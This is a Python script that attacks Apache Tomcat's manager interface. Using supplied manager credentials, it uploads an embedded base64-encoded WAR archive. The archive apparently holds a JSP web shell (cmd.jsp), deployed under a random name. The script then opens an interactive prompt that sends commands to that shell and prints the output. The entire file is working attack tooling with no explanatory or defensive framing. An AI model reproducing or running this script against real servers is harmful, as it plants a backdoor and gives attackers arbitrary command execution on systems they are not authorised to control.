#!/usr/bin/env python3

import requests
from cmd import Cmd
import string
import sys
import random
from base64 import b64encode, b64decode
import re

username = input("username >> ")
password = input("password >> ")
url = input("url >> ")

payload = "UEsDBBQACAAIAO5iUDoAAAAAAAAAAAAAAAAJAAQATUVUQS1JTkYv/soAAAMAUEsHCAAAAAACAAAAAAAAAFBLAwQUAAgACADuYlA6AAAAAAAAAAAAAAAAFAAAAE1FVEEtSU5GL01BTklGRVNULk1G803My0xLLS7RDUstKs7Mz7NSMNQz4OVyLkpNLElN0XWqBAmY6RnEGxooaASX5in4ZiYX5RdXFpek5hYreOYl62nycvFyAQBQSwcIpn5dFkcAAABHAAAAUEsDBAoAAAAAAG5iUDoAAAAAAAAAAAAAAAAIAAAAV0VCLUlORi9QSwMEFAAIAAgAdGJQOgAAAAAAAAAAAAAAAA8AAABXRUItSU5GL3dlYi54bWyFT7EOgjAU3PsVpDt9iE6k4uCqk4ubqeWpJbQlvEr5fJEQjBPbvbt7uTt5GGyT9NiR8W7PNyLjyaFkMuI9VW2bjKqjPX+F0BYAteqVoLcT2lsYJXAEdY7I2eQrBjKLN8Yo4lb47gl5lm3gej5d9AutSo2joJz+fpEpaCJPXqswVViJYis6zM1v+W0nBqo4W8blYsfHaYRd32D4odQpi+XRW6tcJeGPZbKmNn2YBkvQthLjJWGh2OL+wjm5ZB9QSwcIadKRAb0AAABVAQAAUEsDBBQACAAIAFliUDoAAAAAAAAAAAAAAAAHAAAAY21kLmpzcH2SXWvCMBSG7/srzgJCq6O939oyvzYdaovWgZeZPWpGk3ZpMjfG/vuSqkyESSA5yfvkzUlywtYDVHSLwHhVShWRN/pBfa1Y4bdvm5iVfpu0YidsObYfZdNJHPaSwSp2+iXnVOQ17JnawfMidcLHZD6F6TAbJYOIPA0zArPudBgR/rUpJSfQ7WfjZBYRYqzGs3SZQbZKja7wU53YNc8v5Vq/cmaAl+5kaaYLFA0S2OPMWElsEmQbcCW+a6yVv0WVUkk5KpRu4+nBTQRCF4UH306plV9JJlQhXHK8yB0Q6MA1gw6QsDePiXfvpLJcY11DBRHMtVCMo91yDF3Px09cX8vGeCRaVVotlETKoayNU2XJ82XXYGPxRzFxos5WLTSgip6DObN+AvdwobhMGNzETGwtJQ1mBt9o+YQJtGb7HSsQ3IN8fDW4fDYrGvYfix/TbMEEh88JmpIJg6Z+nF9QSwcI0lMwLF0BAAB3AgAAUEsBAhQAFAAIAAgA7mJQOgAAAAACAAAAAAAAAAkABAAAAAAAAAAAAAAAAAAAAE1FVEEtSU5GL/7KAABQSwECFAAUAAgACADuYlA6pn5dFkcAAABHAAAAFAAAAAAAAAAAAAAAAAA9AAAATUVUQS1JTkYvTUFOSUZFU1QuTUZQSwECCgAKAAAAAABuYlA6AAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAADGAAAAV0VCLUlORi9QSwECFAAUAAgACAB0YlA6adKRAb0AAABVAQAADwAAAAAAAAAAAAAAAADsAAAAV0VCLUlORi93ZWIueG1sUEsBAhQAFAAIAAgAWWJQOtJTMCxdAQAAdwIAAAcAAAAAAAAAAAAAAAAA5gEAAGNtZC5qc3BQSwUGAAAAAAUABQAlAQAAeAMAAAAA"

class Terminal(Cmd):
    prompt = "cmd >> "
    def default(self, args):
        run_commands(args)
def run_commands(cmd):
    global file_name, url
    data = {"cmd" : cmd}
    out = requests.post(f"{url}/{file_name}.war/cmd.jsp", data=data)
    try:
        filtered = re.search("\x42\x52\x3e\x0a(.*?)\x0a\x3c\x2f\x70", out.text, re.DOTALL).group(1)
        print(filtered)
    except:
        pass
        print(out.text)

def uploader():
    global username, password, url, payload, file_name
    file_name = "".join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(10))
    sess = requests.session()
    creds = b64encode(f"{username}:{password}".encode())
    auth = {"Authorization" : f"Basic {creds.decode()}"}
    proxy = {"http" : "http://127.0.0.1:8080"}
    confirm = sess.put(f"{url}/manager/text/deploy?path=/{file_name}.war", data=b64decode(payload), headers=auth)
    if "OK" in confirm.text:
        print("[+] War Shell uploaded successfully")
        print(confirm.text)
    else:
        print("[-] Am not sure if the War Shell was uploaded fine\n[*] Continuing anyway")

if __name__ == ("__main__"):
    uploader()
    terminal = Terminal()
    terminal.cmdloop()
